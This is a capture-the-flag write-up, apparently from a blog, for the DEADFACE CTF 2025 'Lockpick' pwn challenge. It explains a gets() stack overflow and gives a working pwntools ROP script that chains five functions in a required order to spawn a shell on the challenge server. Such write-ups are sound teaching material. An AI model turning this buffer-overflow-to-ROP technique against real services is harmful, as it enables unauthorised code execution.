---
title: "Lockpick"
author: "s0g3king"
date: 2025-10-24
categories: ["Pwn", "DEADFACE CTF 2025"]
tags: ["ret2win", "rop", "bof", "gets"]
partial_solve: false
used_ai: false
---

## Challenge

A 64-bit ELF, `nc lockpick.deadface.io 26697`. You have to "pick a lock" by
clicking five pins in the right order. Mitigations:

```text
Arch:   amd64
RELRO:  Partial
Stack:  No canary
NX:     enabled
PIE:    No PIE   (EXEC, addresses are fixed 0x40xxxx)
```

No canary + no PIE + a `gets()` call is the giveaway: stack overflow -> ROP.

## Recon

`main` reads input in `vuln`, then only spawns a shell if all five pins are set:

```c
vuln();                 // gets() overflow lives here
if (pin1 && pin2 && pin3 && pin4 && pin5)
    system(shell);      // shell is a global char[]
```

`vuln` overflows a 64-byte buffer at `rbp-0x40`, so the return address is at
offset **72** (64 + 8 saved rbp):

```asm
vuln:
    sub    rsp, 0x40
    lea    rax, [rbp-0x40]
    call   gets            ; unbounded read -> overflow
```

The pins are set by `pick1`..`pick5`, but each one guards on a *different* pin
already being set, which enforces an order:

| function | requires | sets  | extra                       |
|----------|----------|-------|-----------------------------|
| `pick3`  | –        | pin3  |                             |
| `pick5`  | pin3     | pin5  |                             |
| `pick4`  | pin5     | pin4  |                             |
| `pick1`  | pin4     | pin1  |                             |
| `pick2`  | pin1     | pin2  | `strcpy(shell, TrueShell)`  |

If a pick is called out of order it prints "a pin was skipped!" and `exit()`s.
Following the dependency chain from the one with no prerequisite (`pick3`) gives
the only valid order: **3 -> 5 -> 4 -> 1 -> 2**.

There's a second trap. The `shell` global doesn't start as `/bin/sh`:

```text
.data 404040:  2f676868 2f6f7000   "/ghh/op\0"   <- shell
.data 404048:  2f62696e 2f736800   "/bin/sh\0"   <- TrueShell
```

`system(shell)` on `/ghh/op` does nothing useful — but `pick2` runs
`strcpy(shell, TrueShell)`, overwriting it with `/bin/sh`. So `pick2` has to be
part of the chain anyway, which the ordering already forces.

## Exploit

There are no arguments to set up (the picks take none), so we just chain the five
`pick` functions as ROP gadgets in dependency order, then return to `main` so its
`pin1..pin5` check runs and calls `system("/bin/sh")`.

```python
from pwn import *

r = remote("lockpick.deadface.io", 26697)

offset = 72
pick1 = 0x000000000040125e
pick2 = 0x00000000004012a3
pick3 = 0x0000000000401301
pick4 = 0x0000000000401321
pick5 = 0x0000000000401366
main  = 0x00000000004013ea

payload  = b"a" * offset
payload += p64(pick3)      # set pin3
payload += p64(pick5)      # needs pin3 -> pin5
payload += p64(pick4)      # needs pin5 -> pin4
payload += p64(pick1)      # needs pin4 -> pin1
payload += p64(pick2)      # needs pin1 -> pin2 + strcpy(shell, "/bin/sh")
payload += p64(main)       # re-run the pin check -> system("/bin/sh")

r.recvrepeat(1)
r.sendline(payload)
r.interactive()
```

Every pick prints "Pin N clicked!", all five pins end up set, and returning to
`main` fires `system("/bin/sh")`.

## Flag

`DEADFACE{REDACTED}`

## Notes

- The five picks are plain gadgets ending in `ret`, so no stack alignment or
  argument gadgets are needed — just return into each in turn.
- Miss the order and the guard calls `exit()`, so the chain has to be exactly
  3, 5, 4, 1, 2.
- Solved by hand from the disassembly (`used_ai: false`).
